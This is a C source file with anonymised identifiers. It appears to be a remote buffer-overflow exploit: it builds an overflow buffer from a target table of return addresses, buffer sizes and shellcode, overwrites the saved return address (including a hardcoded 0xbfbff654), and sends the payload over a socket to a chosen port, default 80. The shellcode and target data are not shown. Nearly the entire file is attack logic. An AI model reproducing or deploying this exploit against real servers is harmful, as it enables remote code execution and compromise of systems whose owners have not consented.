
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {scalar_t__ retaddress; int bufsize; int junk; char* shellcode; long offset; } ;


 int VAR_0 ;
 int FUNC_0 (int ) ;
 int FUNC_1 (int) ;
 int FUNC_2 (int,char**,char*) ;
 scalar_t__ FUNC_3 (int) ;
 int FUNC_4 (char*,char*,int) ;
 int FUNC_5 (char*,int ,int) ;
 int FUNC_6 (int) ;
 int VAR_1 ;
 int FUNC_7 (int) ;
 int FUNC_8 (int) ;
 char* VAR_2 ;
 int FUNC_9 (char*,char*) ;
 int FUNC_10 (char*,char*) ;
 int FUNC_11 (char*) ;
 TYPE_1__* VAR_3 ;
 int FUNC_12 (char*) ;
 int FUNC_13 (int,char*,int) ;

int FUNC_14(int VAR_4, char **VAR_5){

  char *VAR_6,*VAR_7;
  long VAR_8;
  char VAR_9[200];
  int VAR_10,VAR_11,VAR_12,VAR_13=0,VAR_14=0,VAR_15=80,VAR_16=250;

  if(VAR_4 < 2) { FUNC_12(VAR_5[0]); }

  while ((VAR_12 = FUNC_2 (VAR_4, VAR_5, "dh:o:l:p:t:")) != -1){
    switch (VAR_12){
    case 'd':
 VAR_13 = 1;
 break;
    case 'o':
      VAR_16 = FUNC_0(VAR_1);
      break;
    case 'p':
      VAR_15 = FUNC_0(VAR_1);
      break;
    case 't':
      VAR_14 = FUNC_0(VAR_1);
      break;
    default :
      FUNC_12(VAR_5[0]);
    }
  }

  if((VAR_3[VAR_14].retaddress) != 0) {
    VAR_6 = (char *)FUNC_3((VAR_3[VAR_14].bufsize));



    if(VAR_3[VAR_14].junk == 1) {

    VAR_7 = (char *)FUNC_3(FUNC_11(VAR_2) + FUNC_11(VAR_3[VAR_14].shellcode));

    FUNC_10(VAR_7,VAR_3[VAR_14].shellcode);
    FUNC_9(VAR_7,VAR_2);

    VAR_3[VAR_14].shellcode = VAR_7;

    }

    FUNC_5(VAR_6,VAR_0,VAR_3[VAR_14].bufsize);
    FUNC_4(VAR_6 + (VAR_3[VAR_14].bufsize) - (FUNC_11(VAR_3[VAR_14].shellcode) + 8) ,VAR_3[VAR_14].
shellcode,FUNC_11(VAR_3[VAR_14].shellcode));


    *(long *)&VAR_6[(VAR_3[VAR_14].bufsize) - 8] = (VAR_3[VAR_14].retaddress - VAR_3[VAR_14].offset);




    if(VAR_14 == 4) {
       *(long *)&VAR_6[(VAR_3[VAR_14].bufsize) - 8] = 0xbfbff654;
    }

    *(long *)&VAR_6[(VAR_3[VAR_14].bufsize) - 4] = (VAR_3[VAR_14].retaddress - VAR_3[VAR_14].offset);


    if(VAR_13 == 1) {
    *(long *)&VAR_6[(VAR_3[VAR_14].bufsize) - 8] = 0x41414141;
    *(long *)&VAR_6[(VAR_3[VAR_14].bufsize) - 4] = 0x41414141;
    }
  }

  VAR_10 = FUNC_6(VAR_15);

  FUNC_13(VAR_10,VAR_6,FUNC_11(VAR_6));
  FUNC_13(VAR_10,"\n",1);
  FUNC_13(VAR_10,"\n",1);

  FUNC_8(1);
  FUNC_7(VAR_10);

  FUNC_1(VAR_10);
  return 0;

}
